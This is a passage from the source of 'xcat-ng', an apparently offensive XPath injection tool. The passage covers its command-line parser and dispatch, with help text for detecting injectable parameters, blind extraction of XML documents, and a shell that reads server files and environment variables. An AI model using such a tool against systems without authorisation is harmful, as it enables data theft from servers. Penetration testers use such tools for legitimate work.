        print(_c("═" * 64, T.BOLD))
        for ln in xml_lines:
            s = ln.strip()
            print(_c(ln, T.CYAN) if s.startswith("<") else _c(ln, T.GREEN))
        print(_c("═" * 64, T.BOLD))

        if getattr(args, "output", None):
            Path(args.output).write_text("\n".join(xml_lines))
            ok(f"Saved → {args.output}")
    finally:
        await ctx.close()


async def cmd_shell(args: argparse.Namespace):
    ctx = _build_context(args)
    await ctx.start()
    try:
        if not await _setup(ctx):
            sys.exit(1)
        await shell_loop(ctx)
    finally:
        await ctx.close()


def cmd_injections(_args: argparse.Namespace):
    print(_c("Supported injection templates:\n", T.BOLD))
    for i, inj in enumerate(INJECTIONS, 1):
        payloads = inj.test_payloads("<working_value>")
        print(f"  {_c(str(i), T.CYAN)}. {inj.name}")
        print(f"     Example : {_c(inj.example, T.GRAY)}")
        for pl, expected in payloads:
            tag = _c("TRUE ", T.GREEN) if expected else _c("FALSE", T.RED)
            print(f"     {tag}   {pl}")
        print()


# ══════════════════════════════════════════════════════════════════════════════
# Argument parser
# ══════════════════════════════════════════════════════════════════════════════

def _add_common(p: argparse.ArgumentParser):
    src = p.add_argument_group("Request source  (choose one)")
    me  = src.add_mutually_exclusive_group()
    me.add_argument("-r", "--request", metavar="FILE",
                    help="Burp Suite raw HTTP request file")
    me.add_argument("--url", metavar="URL",
                    help="Target URL  (use with --param and --param-values)")

    pg = p.add_argument_group("Parameters  (used with --url)")
    pg.add_argument("--param", dest="target_param", metavar="NAME",
                    help="Parameter to inject into (default: probe all)")
    pg.add_argument("--param-values", nargs="*", metavar="KEY=VALUE",
                    help="All query/URL parameters  e.g. q=hello page=1")
    pg.add_argument("--body-param", nargs="*", metavar="KEY=VALUE",
                    help="POST body parameters")
    pg.add_argument("-m", "--method", default="GET", metavar="METHOD",
                    help="HTTP method (default: GET)")
    pg.add_argument("--header", nargs="*", metavar="'Name: value'",
                    help="Extra request headers")

    og = p.add_argument_group(
        "Oracle  (at least one required)",
        description=(
            "Define what a TRUE vs FALSE XPath response looks like.\n"
            "TRUE  = XPath condition matched  (e.g. correct character guessed)\n"
            "FALSE = XPath condition did not match\n"
            "Prefix value with ! to negate  (e.g. --true-string '!No results')"
        ),
    )
    og.add_argument("--true-string",  metavar="TEXT",
                    help="String present in a TRUE response (! to negate)")
    og.add_argument("--true-code",    metavar="CODE",
                    help="HTTP status code for TRUE response (! to negate, e.g. !404)")
    og.add_argument("--false-string", metavar="TEXT",
                    help="String present in a FALSE response")
    og.add_argument("--false-code",   metavar="CODE",
                    help="HTTP status code for FALSE response")

    xo = p.add_argument_group("Options")
    xo.add_argument("-c", "--concurrency", type=int, default=DEFAULT_CONCURRENCY,
                    metavar="N", help=f"Concurrent requests (default: {DEFAULT_CONCURRENCY})")
    xo.add_argument("--fast", action="store_true",
                    help=f"Cap extracted strings at {FAST_MODE_LEN} chars")
    xo.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT,
                    metavar="SEC", help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT})")
    xo.add_argument("--proxy", metavar="URL",
                    help="HTTP proxy  e.g. http://127.0.0.1:8080")
    xo.add_argument("--tamper", metavar="FILE",
                    help="Python script to tamper requests (must export tamper(ctx, kwargs))")
    xo.add_argument("--enable",  nargs="*", metavar="FEATURE",
                    help="Force-enable a feature (skip detection)")
    xo.add_argument("--disable", nargs="*", metavar="FEATURE",
                    help="Force-disable a feature")


def build_parser() -> argparse.ArgumentParser:
    root = argparse.ArgumentParser(
        prog="xcat-ng",
        description=(
            "xcat-ng  --  Modern XPath Injection Framework (next-generation)\n\n"
            "Commands:\n"
            "  detect      Probe parameters, identify injection type and server features\n"
            "  run         Extract the full XML document\n"
            "  shell       Interactive XPath shell\n"
            "  injections  List all supported injection templates\n\n"
            "Use  xcat-ng <command> --help  for per-command details."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    root.add_argument("-v", "--verbose", action="store_true",
                      help="Verbose/debug output")
    root.add_argument("--version", action="version", version="xcat-ng")

    sub = root.add_subparsers(dest="command", required=True)

    # ── detect ────────────────────────────────────────────────────────────────
    p_detect = sub.add_parser(
        "detect",
        help="Find injection point and detect server XPath features",
        description="""
DETECT — identify injection and server capabilities
====================================================
Tests all parameters with all injection templates.
Reports working injector type and all detected server features.
Does NOT extract data. Use 'run' or 'shell' for that.

Examples:
  xcat-ng detect -r burp.txt --true-string "Results:"
  xcat-ng detect -r burp.txt --false-string "No Results!"
  xcat-ng detect -r burp.txt --true-string "Results:" --param q -v
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    _add_common(p_detect)

    # ── run ───────────────────────────────────────────────────────────────────
    p_run = sub.add_parser(
        "run",
        help="Extract the full XML document from the target",
        description="""
RUN — extract the full XML document
=====================================
Finds injection, detects features, then extracts the entire XML document
using boolean blind extraction.

Character search strategy is auto-selected by detected features:
  codepoint-search  →  O(log N) via string-to-codepoints (XPath 2.0)
  substring-search  →  O(log N) via substring-before
  fallback          →  O(N)  frequency-ordered linear scan

Live output: each XML tag is printed as soon as its name is known.
A clean summary is printed at the end.

Examples:
  xcat-ng run -r burp.txt --true-string "Results:"
  xcat-ng run -r burp.txt --false-string "No Results!" --fast -c 20
  xcat-ng run -r burp.txt --true-string "Results:" -o extracted.xml
  xcat-ng run --url http://host/page --param q --param-values q=test \\
              --true-string "found"
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    _add_common(p_run)
    p_run.add_argument("-o", "--output", metavar="FILE",
                       help="Save extracted XML to file")
    p_run.add_argument("--max-depth", type=int, default=12, metavar="N",
                       help="Max XML tree depth (default: 12)")
    p_run.add_argument("--max-children", type=int, default=40, metavar="N",
                       help="Max children per node (default: 40)")

    # ── shell ─────────────────────────────────────────────────────────────────
    p_shell = sub.add_parser(
        "shell",
        help="Interactive XPath extraction shell",
        description="""
SHELL — interactive XPath shell
=================================
Finds injection, detects features, then opens an interactive shell
for manual exploration.

Shell commands:
  get  <xpath>       Dump full XML subtree at XPath
  get-string <xpath> Get string value of XPath expression
  env  [name]        List env vars or get specific one
  pwd                Print working directory
  time               Print server date/time
  cat  <path>        Read file via unparsed-text()
  find <name>        Search file in parent directories
  features           Show all detected features
  toggle <feature>   Toggle a feature on/off
  help               Show all commands
  exit               Exit

Examples:
  xcat-ng shell -r burp.txt --true-string "Results:"
  xcat-ng shell -r burp.txt --false-string "No Results!" --param q
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    _add_common(p_shell)

    # ── injections ────────────────────────────────────────────────────────────
    sub.add_parser(
        "injections",
        help="List all supported injection templates with test payloads",
    )

    return root


# ══════════════════════════════════════════════════════════════════════════════
# Entry point
# ══════════════════════════════════════════════════════════════════════════════

def main():
    global _verbose

    print(BANNER)
    parser = build_parser()
    args   = parser.parse_args()
    _verbose = getattr(args, "verbose", False)

    dispatch = {
        "detect":     cmd_detect,
        "run":        cmd_run,
        "shell":      cmd_shell,
        "injections": cmd_injections,
    }

    fn = dispatch[args.command]
    if args.command == "injections":
        fn(args)
    else:
        try:
            asyncio.run(fn(args))
        except KeyboardInterrupt:
            warn("Interrupted.")


if __name__ == "__main__":
    main()
